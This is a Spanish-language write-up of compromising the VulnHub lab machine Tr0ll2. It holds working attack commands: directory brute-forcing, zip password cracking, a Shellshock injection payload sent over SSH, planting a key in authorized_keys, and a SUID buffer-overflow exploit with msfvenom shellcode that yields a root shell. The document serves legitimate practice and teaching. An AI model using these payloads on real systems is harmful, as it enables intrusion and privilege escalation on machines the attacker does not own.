# VulnHub

## Troll2 (Work in progress)
- Hago un port scan con NMap (nmap -sV -O -n 192168.161.0/24) para ver qué equipos y que puertos/servicios tienen levantados. La máquina Troll1 tiene dos adaptadores y espero encontrar dos IP respondiendo. Pero solo encuentro uno. En una de ellas veo que están levantados los puertos 21 (VSFtpd 2.0.8, vulnerable) y 22 (OpenSSH 5.9p1, vulnerable).
<img width="801" height="255" alt="image" src="https://github.com/user-attachments/assets/17233f55-3631-426e-bf9a-5794d0a45dd4" />
  
- Vemos que efectivamente hay levantado un Web Server en el puerto 80. Utilizando gobuster contra esta dirección IP y pasándole unos cuantos nombres habituales de directorios encuentra varios directorios.

```bash
gobuster dir -u http://192.168.161.140 -w dirs.txt
```

- Dentro de robots.txt encuentro una lista de directorios. Paso esa lista a un fichero y con un bucle en bash recorro cada una de las carpetas y descargo su contenido.  
```bash
while read url; do wget -m -p -k -E -np "http://192.168.161.140$url";done < urls.txt
```
- En varios directorios hay una imagen de un gato. En uno de ellos el fichero es algo mayor que en los demás y se me ocurre que puede haber algo escondido usando alguna forma de esteganografía. Vuelco el contenido de la imagen usando **xxd**.  
<img width="676" height="131" alt="image" src="https://github.com/user-attachments/assets/26a97ec7-27cc-4493-968c-2148abcdb2d2" />

He visto que también se pueden buscar cadenas de texto dentro de ficheros usando la utilidad **strings**.  
- Pruebo a cargar la URL del servidor Web que me sugiere en el fichero **/y0ur_self** y veo que hay un fichero llamado answers.txt que contiene casi 100000 líneas. Cada una de estas líneas contiene un texto cdificado con Base64.
- Paso esa lista a otro fichero y con un bucle en bash decodifico cada una de las cadenas y las guardo en un fichero.

```bash
base64 -d answer.txt > decoded.txt
```  

<img width="1225" height="235" alt="image" src="https://github.com/user-attachments/assets/7d354bb9-112a-473a-a649-c19578d7f522" />

**A partir de aquí me he guiado por algún documento de ayuda. 😓Y cambién a Kali. Es tontería instalar cada herramienta cuando Kali ya las trae. **

- No se me había ocurrido pensar que podía hacer un FTP e intentar con el usuario Tr0ll/Tr0ll.  
<img width="553" height="256" alt="image" src="https://github.com/user-attachments/assets/3a929c66-fa20-4282-9cbe-f9acc1d017e2" />  

- Descargo el fichero ZIP lmao.zip y lo descompacto usando la herramienta **fcrackzip**. Kali no la trae así que tengo que instalarla.
```bash
sudo apt-get install fcrackzip
```
- Utilizo el fichero answers.txt que decodifiqué antes como diccionario.
```bash
fcrackzip lmao.zip -D decoded.txt
```
<img width="493" height="129" alt="image" src="https://github.com/user-attachments/assets/5be4ed54-3e6f-496a-9bdb-a07e640426a2" />  

- Descompacto el fichero con la contraseña y encuentro que contiene el fichero noob que es una clave pública.
<img width="531" height="469" alt="image" src="https://github.com/user-attachments/assets/c1055204-d586-4054-bdd6-5c6cce96f03e" />

- Intento conectarme via SSH pero pasando esta clave pública en lugar de una contraseña. Tengo que pasar el parámetro PubkeyAcceptedKeyTypes para que me acepte la clave.
```bash
ssh -o PubkeyAcceptedKeyTypes=+ssh-rsa -i noob noob@192.168.161.140
```
No me deja entrar pero responde. Vamos bien. 

<img width="659" height="128" alt="image" src="https://github.com/user-attachments/assets/ed9f7802-17a8-4156-a218-dc9d25ce50f2" /> 

Si intento conectarme haciendo un verbose veo que hay un *Remote: Forced Command* que suele ser vulnerable a un ataque  Shellshock.

<img width="693" height="291" alt="image" src="https://github.com/user-attachments/assets/e414d7e2-bad6-49ef-b2ed-f6a390af17ce" />

Lo verifico con el siguiente comando. 
```bash
ssh noob@192.168.161.140 -o PubkeyAcceptedKeyTypes=+ssh-rsa -i noob '() { :;}; echo Genaro' 
```
<img width="798" height="124" alt="image" src="https://github.com/user-attachments/assets/7cd13190-676d-45b3-8fe4-aa84457ce51d" />

- Intento aprovecharme de la vulnerabilidad y veo que he abierto una terminal en la máquina remota.
<img width="756" height="455" alt="image" src="https://github.com/user-attachments/assets/74394035-daaf-473b-b9e0-a850e07a9876" />

- Quizá podría seguir en esta terminal, pero he visto que podemos añadir una clave pública para que me deje conectarme con una terminal 'de verdad' desde la máquina atacante. Para ello genero un par de claves en la máquina atacante. Indico la longitud 'minima'.
  
<img width="884" height="488" alt="image" src="https://github.com/user-attachments/assets/921e6209-c9a8-4a0d-89ac-2fef6c69d199" />

- En la máquina atacada añado la clave a la lista de autorizadas.

```bash
echo '*<contenido de nuestro fichero con la clave pública>*' > /home/noob/.ssh/authorized_keys
```
<img width="872" height="118" alt="image" src="https://github.com/user-attachments/assets/c7444108-d3c0-4156-80c6-019a9ba1603f" />

- Ahora ya puedo abrir una sesión directamente desde la máquina atacada.

<img width="690" height="181" alt="image" src="https://github.com/user-attachments/assets/46b664b6-ff27-4ee5-aa1b-38297ef1a624" />  

## Exploración 
- Miro a ver qué encuentro a partir del directorio raíz.
 
<img width="847" height="448" alt="image" src="https://github.com/user-attachments/assets/7a517b78-ee84-4d17-9281-f53e3a88dc5c" />

- Seguramente donde pone que no hay nada ... es donde está. Veo que hay una carpeta con 'tres puertas'. Y que cada una de ellas tiene el mismo fichero aunque en una de ellas el tamaño es claramente diferente. Así que esa será la puerta que elegiré.
<img width="550" height="308" alt="image" src="https://github.com/user-attachments/assets/47039a7e-28f5-4823-88dc-dce535f19cf2" />  

**Nota**: Las puertas cambian periódicamente. Incluso con la sesión abierta. Y si ejecutas uno de los *r00t* que no es el correcto, se bloquea el comando **ls** durante dos minutos.  

<img width="615" height="73" alt="image" src="https://github.com/user-attachments/assets/5483e5d6-3775-4fb1-a2ae-64fb024841da" />  

También puede ser que te eche directamente de la sesión:  
<img width="621" height="167" alt="image" src="https://github.com/user-attachments/assets/c473ab5d-b113-4e8c-b1fd-a3b91de950ff" />  

Puedo 'detectar' que se ha producido un cambio de puertas si al hacer un *ls* me sale un error diciendo que no existe el directorio. En ese caso subo al nivel superior del directorio y vuelvo a entrar.  
<img width="607" height="57" alt="image" src="https://github.com/user-attachments/assets/9f8e6560-e2e1-4ebe-8eec-778881f3d582" />

Si selecciono la puerta correcta, veo que me dice que es necesario proporcionar un texto de entrada que muestra por pantalla. Parece candidato a un ataque de Buffer Overflow ya que también puedo ver que estos *r00t* tienen como owner a *root* y además tienen el SUID activado.

<img width="589" height="133" alt="image" src="https://github.com/user-attachments/assets/d5fb4dcb-538b-40ac-86c7-20c68b1d1e24" />  

### Buffer Overflow
- Lanzo un bucle de manera que vaya probando con diferentes longitudes.
```bash
for i in {1..1000..50}; do printf "\nIntentando: %d\n" "$i"; ./door2/r00t "$(python -c "print('A'*$i)")"; done;
```
- Y veo que falla cuando llego a las 300.
<img width="887" height="386" alt="image" src="https://github.com/user-attachments/assets/4f00cae9-df84-4a14-8df1-465bb80310d6" />  

- Podría simplemente lanzar *r00t* desde el depuerador con 300 A's. Pero entonces no sé donde ha quedao los punteros.  
<img width="786" height="135" alt="image" src="https://github.com/user-attachments/assets/0c863fb1-092b-4a29-909d-9c6851ca1a6f" />

- Así que uso un script que viene con Metasploit que me permite generar algo más fácil de buscar.
  
```bash
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 300
```

<img width="886" height="92" alt="image" src="https://github.com/user-attachments/assets/d559f53f-c9be-4ef4-b041-afa3b6329e06" />

- Y de vuelta en la máquina atacada lo paso como parámetro.
<img width="873" height="214" alt="image" src="https://github.com/user-attachments/assets/703c73de-7592-4fce-b52c-2e11e86009bb" />

- Ahora en la máquina Kali puedo utilizar otro script de Metasploit para encontrar en que posición se encuentra el valor que ha salido **6a413969**. Este valor no es dirección sino una secuencia de caracteres de nuestra entrada que ha sobreescrito un registro (overflow).

<img width="658" height="101" alt="image" src="https://github.com/user-attachments/assets/a9d94a85-8656-4729-a31c-a36899e16972" />

- Veo que está en el offset 268 de nuestra cadena de 300 caracteres. Así que ahora sí, paso 268 A's y 4 B's y veo que estas aparecen en el punto donde se ha producido el error.
<img width="856" height="136" alt="image" src="https://github.com/user-attachments/assets/899f7f03-e284-4aef-a0e3-36c06ea137d4" />

- Si muestro las variables de entorno, veo que hay bastantes. Esto puede afectarme a los punteros. 
<img width="646" height="337" alt="image" src="https://github.com/user-attachments/assets/5c412622-f829-4b9d-b0d1-ddbcae5602f3" />

- Así que repito la operación y me aseguro de que no hay ninguna variable.  
<img width="749" height="113" alt="image" src="https://github.com/user-attachments/assets/f629b2e7-fe50-4692-841a-c25587b8c066" />

**Nota**. Parece que afecta si lanzo el *debugger* desde en el directorio en el que se encuentra la aplicación (gdb ./r00t) o utilizo un path (gdb ./door3/r00t).

- Paso la misma cadena de entrada pero con 16 \x90 (NOP's) y 100 C's donde irá más tarde la *payload*. Compruebo los registros. Nos interesa *esp* (Extended Stack Pointer).  
<img width="870" height="394" alt="image" src="https://github.com/user-attachments/assets/79abdfa5-8158-4182-b610-7944d753e0ca" />

- Utilizo otra herramienta de Metasploit para que me genere el *payload* que añadiremos a esos 268+4+16 caracteres. Le pido que evite los caracteres \x00, \x0a y \x0d que podrían hacer que fallara el ataque.
```bash
msfvenom -p linux/x86/exec -f py CMD="/bin/sh" -b '\x00\x0a\x0d'
```
<img width="727" height="282" alt="image" src="https://github.com/user-attachments/assets/9a9760d7-0836-4b22-97d2-e50f93ca39ae" />

- Concateno toda la cadena del código Python que me ha generado en una línea. Además le paso las 268 A's de relleno, la dirección de ejecucíón (donde antes estaban las B's) en formato *least significant byte first* y una secuencia de 16 \x90 (código NOP).

```bash
env - ./r00t $(python -c 'print "A" * 268 + "\x80\xfc\xff\xbf" + "\x90" * 16 + "\xb8\xc7\x3a\x4a\x85\xd9\xce\xd9\x74\x24\xf4\x5a\x29\xc9\xb1\x0b\x31\x42\x15\x83\xea\xfc\x03\x42\x11\xe2\x32\x50\x41\xdd\x25\xf7\x33\xb5\x78\x9b\x32\xa2\xea\x74\x36\x45\xea\xe2\x97\xf7\x83\x9c\x6e\x14\x01\x89\x79\xdb\xa5\x49\x55\xb9\xcc\x27\x86\x4e\x66\xb8\x8f\xe3\xff\x59\xe2\x84"')
```

- Si lo ejecuto obtengo un shell en el que soy root.

<img width="867" height="126" alt="image" src="https://github.com/user-attachments/assets/d4f1ed42-3fd3-496d-966e-f71295a49d7d" />

- Ahora solo tengo que buscar el fichero donde está el token. Como *bonus* tengo los scripts que alteran las puertas y alguna cosa más.
<img width="710" height="355" alt="image" src="https://github.com/user-attachments/assets/441b2583-2214-4201-ba63-4ab1f3122558" />

- Saco el token y prueba finalizada.  
<img width="449" height="93" alt="image" src="https://github.com/user-attachments/assets/c6be60d0-62f7-4116-8b68-75866ad7fc00" />








